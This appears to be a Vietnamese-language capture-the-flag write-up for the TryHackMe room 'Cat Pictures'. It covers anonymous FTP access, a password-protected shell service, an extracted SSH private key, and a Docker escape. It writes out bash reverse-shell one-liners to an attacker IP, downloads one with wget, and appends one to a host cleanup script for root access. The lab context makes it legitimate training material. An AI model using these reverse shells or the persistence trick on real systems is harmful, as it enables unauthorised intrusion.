---
layout: post
author: "Neo"
title: "Tryhackme - Cat Pictures"
date: "2022-04-05"
tags: [
    "tryhackme",
    "web",
    "linux",
	"ftp",
    "ssh",
    "docker"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-04-05-THM-Cat-Pictures.png)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Cat Pictures](https://tryhackme.com/room/catpictures)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT     STATE SERVICE      REASON  VERSION
21/tcp   open  ftp          syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.0.191
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh          syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37436480d35a746281b7806b1a23d84a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H
|   256 53c682efd27733efc13d9c1513540eb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
|   256 ba97c323d4f2cc082ce12b3006189541 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
4420/tcp open  nvm-express? syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open  http         syn-ack Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Với ftp port 21, tôi có user Anonymous có 1 file tên *note.txt*. Truy cập vào nó để lấy file này về

```python
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.107.28
Connected to 10.10.107.28.
220 (vsFTPd 3.0.3)
Name (10.10.107.28:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> 
ftp> dir
229 Entering Extended Passive Mode (|||60158|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> get note.txt /home/kali/note.txt
local: /home/kali/note.txt remote: note.txt
229 Entering Extended Passive Mode (|||53132|)
150 Opening BINARY mode data connection for note.txt (162 bytes).
100% |************************************************|   162      176.96 KiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (0.50 KiB/s)
ftp> 
```

`note.txt`

```python
┌──(kali㉿kali)-[~]
└─$ cat note.txt 
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
                    
┌──(kali㉿kali)-[~]
└─$ 
```

Sau khi tìm hiểu 1 chút thì tôi biết được port 4420 với service nvm-express hay còn gọi là NVMe là 1 chuẩn giao tiếp cho ổ cứng SSD. Sử dụng `netcat` để kết nối đến port này

`nc 10.10.107.28 4420`

```python
┌──(kali㉿kali)-[~]
└─$ nc 10.10.107.28 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
ls
bin
etc
home
lib
lib64
opt
tmp
usr
```

Shell này khó dùng quá. Tuy nhiên sau khi tìm kiếm xung quanh 1 lúc thì tôi tìm thấy `wget` trong thư mục */usr/bin*

Điều này có nghĩa là tôi có thể tải lên tệp bằng wget. Vậy thì tôi sẽ tạo 1 file sh chứa RCE và đẩy nó lên machine

```python
┌──(kali㉿kali)-[~]
└─$ echo "bash -i >& /dev/tcp/10.6.0.191/9001 0>&1" > exploit.sh   
```

Tạo local http server 

```python
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Tải file RCE lên máy

```python
wget http://10.6.0.191:8000/exploit.sh
ERROR: could not open HSTS store. HSTS will be disabled.
http://10.6.0.191:8000/exploit.sh
Connecting to 10.6.0.191:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 41 [text/x-sh]
Saving to: 'exploit.sh'

     0K                                                       100% 5.61M=0s
```

Bây giờ thì tạo listener vơi port 9001

`nc -lnvp 9001`

Trên machine thực hiện chạy file sh vừa tải lên 

`bash exploit.sh`

```python
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.107.28] 47420
bash: cannot set terminal process group (1839): Inappropriate ioctl for device
bash: no job control in this shell
I have no name!@cat-pictures:/#
```

## SSH

Tôi tìm thấy 1 file *runme* trong thư mục user */home/catlover*. Thử `cat` nó và tôi nhận ra đấy là 1 file binary. Nhưng nhìn kỹ thì có 1 dòng có thể đọc được.

```python
I have no name!@cat-pictures:/home/catlover# cat runme
cat runme
UU   �=x - = 888 XXXDDS�td888 P�td� � � ddQ�tdR�t=��/lib64/ld-linux-x86-64.so.2GNU�GNU��O�y��������?8��GNU▒�▒▒�e�ms��
                                             C���/��*F�m]�S�; �P▒ , 
......

rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd

......
```

Điều này có nghĩa là khi nhập đúng password, tôi sẽ nhận được ssh key

Có 1 cái tên *rebecca* ở phía trước đoạn nhập input. Tôi sẽ thử chạy file này và nhập rebecca

```python
I have no name!@cat-pictures:/home/catlover# ./runme
./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
I have no name!@cat-pictures:/home/catlover# ls -la
ls -la
total 32
drwxr-xr-x 2 0 0  4096 Nov 18 07:24 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rw-r--r-- 1 0 0  1675 Nov 18 07:24 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
I have no name!@cat-pictures:/home/catlover# 
I have no name!@cat-pictures:/home/catlover# cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
I have no name!@cat-pictures:/home/catlover# 
```

Lưu key này về vào login ssh

```python
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa catlover@10.10.213.118
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 17 23:29:45 PST 2022

  System load:                    0.41
  Usage of /:                     37.2% of 19.56GB
  Memory usage:                   60%
  Swap usage:                     0%
  Processes:                      100
  Users logged in:                0
  IP address for eth0:            10.10.213.118
  IP address for br-98674f8f20f9: 172.18.0.1
  IP address for docker0:         172.17.0.1


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
root@7546fa2336d6:/# ls root/
flag.txt
```

## Privilege escalation

Khi kiểm tra qua các thư mục, tôi nhận ra đây là 1 container chứ không phải 1 machine, vì nó *.dockerenv* và thư mục gốc cũng giống với docker image

```python
root@7546fa2336d6:/# ls -la
total 108
drwxr-xr-x   1 root root 4096 Mar 25  2021 .
drwxr-xr-x   1 root root 4096 Mar 25  2021 ..
-rw-------   1 root root  588 Jun  4  2021 .bash_history
-rwxr-xr-x   1 root root    0 Mar 25  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Apr  9  2021 bin
drwxr-xr-x   3 root root 4096 Mar 24  2021 bitnami
drwxr-xr-x   2 root root 4096 Jan 30  2021 boot
```

Thêm 1 điều nữa, bên trong */opt/clean* có 1 file *clean.sh*, file sh này sẽ xóa hết những gì có trong thư mục */tmp*, nhưng thực sự thì điều không quan trọng lắm vì tôi chỉ cần thêm RCE vào file sh này để nó tự thực thi.

```python
root@7546fa2336d6:/# echo "bash -i >& /dev/tcp/10.6.0.191/2402 0>&1" >> opt/clean/clean.sh 
root@7546fa2336d6:/# cat opt/clean/clean.sh 
#!/bin/bash

rm -rf /tmp/*
bash -i >& /dev/tcp/10.6.0.191/2402 0>&1
root@7546fa2336d6:/#
```

Tạo listener với port 2402 và chờ thôi 

`nc -lnvp 2402`

```python
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 2402
listening on [any] 2402 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.213.118] 34968
bash: cannot set terminal process group (2329): Inappropriate ioctl for device
bash: no job control in this shell
root@cat-pictures:~# 
root@cat-pictures:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@cat-pictures:~# ls /root
ls /root
firewall
root.txt
root@cat-pictures:~# 
```